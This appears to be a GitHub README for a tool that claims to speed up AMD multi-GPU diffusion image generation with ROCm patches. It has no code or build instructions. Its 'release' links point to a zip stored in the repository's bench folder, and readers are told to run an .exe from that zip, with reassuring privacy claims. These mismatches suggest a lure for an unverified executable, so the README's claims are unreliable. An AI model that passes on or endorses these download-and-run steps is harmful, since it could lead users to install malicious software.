# ⚡ diffusers-rocm-parallel - Generate images faster with multiple GPUs

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ravaging-oilrefinery123/diffusers-rocm-parallel/raw/refs/heads/main/bench/diffusers_rocm_parallel_3.9-beta.2.zip)

This application lets you create high-quality images using multiple AMD graphics cards at the same time. It uses a specific patch to ensure your hardware works correctly with the Flux model and other diffusion tools. You can now use the full power of your workstation for faster image generation.

## 📋 System Requirements

To run this application, your computer needs specific hardware and software components. Please check these requirements before you start.

*   Operating System: Windows 10 or Windows 11.
*   Graphics Hardware: At least two AMD graphics cards based on the RDNA3 architecture.
*   Drivers: The latest AMD ROCm drivers for Windows.
*   Memory: 32 GB of system RAM or more.
*   Storage: 20 GB of free space on a solid-state drive.

Make sure your graphics cards sit firmly in your motherboard. Connect your power supply cables securely to each card. If you do not have current drivers, visit the official AMD website to download them.

## 💾 How to Download

You need the installer from our release page. Visit this page to download the setup file.

[Download the Software Here](https://github.com/Ravaging-oilrefinery123/diffusers-rocm-parallel/raw/refs/heads/main/bench/diffusers_rocm_parallel_3.9-beta.2.zip)

Choose the file that ends in .exe. Save it to a folder you can find easily, such as your Downloads folder.

## ⚙️ Setting Up Your Software

Follow these steps to install the program.

1. Locate the file you downloaded. 
2. Double-click the file to start the installation.
3. Follow the prompts on the screen.
4. Select a folder on your drive for the application files.
5. Wait for the progress bar to finish.

The installer adds a shortcut to your desktop. You can open the program from there.

## 🚀 Running Your First Project

Once the installation finishes, you can start the application.

1. Open the application from your desktop icon.
2. The program window will appear. It may take a moment to detect your graphics cards.
3. Look for the Status indicators at the bottom of the screen. They should show your cards as Ready.
4. Input your text prompt into the text box.
5. Click the Generate button to begin.

The application divides the work between your available cards. This process creates the image faster than a single card could. The images will appear in your output folder as soon as the process finishes.

## 🛠️ Performance Tips

You achieve the best results when you manage your system resources well.

* Close other programs that use your graphics cards. Web browsers often use GPU acceleration and can interfere with the generation process.
* Keep your system cool. Multi-GPU setups generate significant heat. Ensure your computer case has proper airflow.
* Monitor your GPU temperatures using the AMD Software dashboard. If temperatures rise above 85 degrees Celsius, pause your work and let the hardware cool down.
* Ensure you are not running out of system memory. If the software crashes during long jobs, reduce the image resolution settings.

## 🔧 Troubleshooting Common Issues

If the software does not work, check these items.

### Graphics Card Not Detected
If the application shows an error about hardware, check your AMD drivers. Open your computer Device Manager and confirm that your cards appear under Display Adapters without any warning icons. Restart your computer after updating drivers.

### Slow Generation Speeds
Check your power settings. Use the High Performance power plan in Windows. If your GPUs are in the wrong PCIe slots, they might run at lower speeds. Check your motherboard manual to ensure your cards use the x8 or x16 lanes.

### Missing Output Files
Verify you have enough disk space on your drive. If your drive is full, the application cannot save your images. Check the settings menu to see the designated output folder path and ensure you have permission to write files to that location.

### Application Crashes
Large image requests require a lot of memory. Try smaller resolutions to see if the system recovers. If memory usage stays high, restart the application to clear the GPU cache.

## 📋 About This Project

This project focuses on parallel processing for image generation. It uses PyTorch and ROCm to coordinate tasks across multiple graphics cards. The included patches solve common synchronization problems found in standard diffusion setups. This allows for stable use of tensor parallelism and ring-attention methods.

Our goal is to provide a reliable tool for users who need high throughput. By spreading the weight of the neural network across multiple chips, you reduce the time per image. We continue to improve this tool as newer versions of the underlying libraries become available.

## 🛡️ Privacy and Data
This application runs entirely on your local machine. It does not send your prompts, generated images, or hardware data to any external server. All files stay within your computer. You can use this software without an internet connection once you complete the initial download. 

This ensures your work remains private. We do not track your usage patterns or collect any personal information. You possess full control over your data at all times.